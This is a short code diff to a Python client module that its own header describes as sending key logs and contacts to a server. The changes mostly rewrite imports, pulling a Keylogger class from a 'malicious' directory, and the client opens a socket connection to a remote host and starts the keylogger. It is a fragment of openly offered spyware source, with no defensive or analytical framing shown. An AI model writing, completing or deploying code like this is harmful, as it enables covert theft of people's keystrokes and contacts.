@@ -6,14 +6,14 @@ Client that sends key logs and contacts to server
 import os
 import sys
 
-sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'server')))
+sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'malicious')))
 
 import threading
 import uuid
 from socket import socket, error, AF_INET, SOCK_STREAM
-from server.clnt.constants import EXIT, CLIENT_IP, PORT, NO_DATA, CHARS, FIRST, RANGE_POS_1, RANGE_POS_2, RANGE_POS_3
-from malicious import keylogger
-from server.clnt.protocol import Protocol
+from constants import EXIT, CLIENT_IP, PORT, NO_DATA, CHARS, FIRST, RANGE_POS_1, RANGE_POS_2, RANGE_POS_3
+from keylogger import Keylogger
+from protocol import Protocol
 
 
 class Client:
@@ -26,7 +26,7 @@ class Client:
             self.client_socket = socket(AF_INET, SOCK_STREAM)
             self.client_socket.connect((ip, port))
             self.login()
-            self.keylogger = keylogger.Keylogger()
+            self.keylogger = Keylogger()
             self.output()
         except error as msg:
             print(f"Connection failure: {msg}\n terminating program")
